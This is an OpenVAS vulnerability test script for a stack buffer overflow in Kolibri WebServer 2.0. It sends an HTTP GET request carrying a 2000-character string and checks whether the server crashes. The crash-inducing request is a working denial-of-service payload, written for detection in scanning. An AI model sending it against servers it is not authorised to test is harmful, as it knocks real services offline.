###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_kolibri_webserver_remote_bof_vuln.nasl 11402 2018-09-15 09:13:36Z cfischer $
#
# Kolibri WebServer HTTP Request Buffer Overflow Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804438");
  script_version("$Revision: 11402 $");
  script_cve_id("CVE-2010-5301", "CVE-2014-4158");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-09-15 11:13:36 +0200 (Sat, 15 Sep 2018) $");
  script_tag(name:"creation_date", value:"2014-04-28 15:47:50 +0530 (Mon, 28 Apr 2014)");
  script_name("Kolibri WebServer HTTP Request Buffer Overflow Vulnerability");

  script_tag(name:"summary", value:"This host is running Kolibri WebServer and is prone to denial of service
  vulnerability.");
  script_tag(name:"vuldetect", value:"Send a crafted exploit string via HTTP GET request and check whether it
  is able to crash or not.");
  script_tag(name:"insight", value:"The flaw is due to an error when processing web requests and can be exploited
  to cause a stack-based buffer overflow via an overly long string passed in a
  HEAD or GET request.");
  script_tag(name:"impact", value:"Successful exploitation may allow remote attackers to cause the application
  to crash, creating a denial-of-service condition.");
  script_tag(name:"affected", value:"Kolibri webserver version 2.0");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"http://secunia.com/advisories/43214");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/33027");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/15834");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/126332");
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("kolibri/banner");

  exit(0);
}


include("http_func.inc");

kPort = get_http_port(default:8080);

kBanner = get_http_banner(port: kPort);
if(!kBanner || "server: kolibri" >!< kBanner) exit(0);

## Cross Confirm to avoid FP
if(http_is_dead(port:kPort)) exit(0);

kReq = http_get(item:string("/",crap(length:2000, data:"A")),
                       port:kPort);

## Send crafted request
kRes = http_send_recv(port:kPort, data:kReq);

if(http_is_dead(port:kPort)){
  security_message(port:kPort);
  exit(0);
}

exit(99);
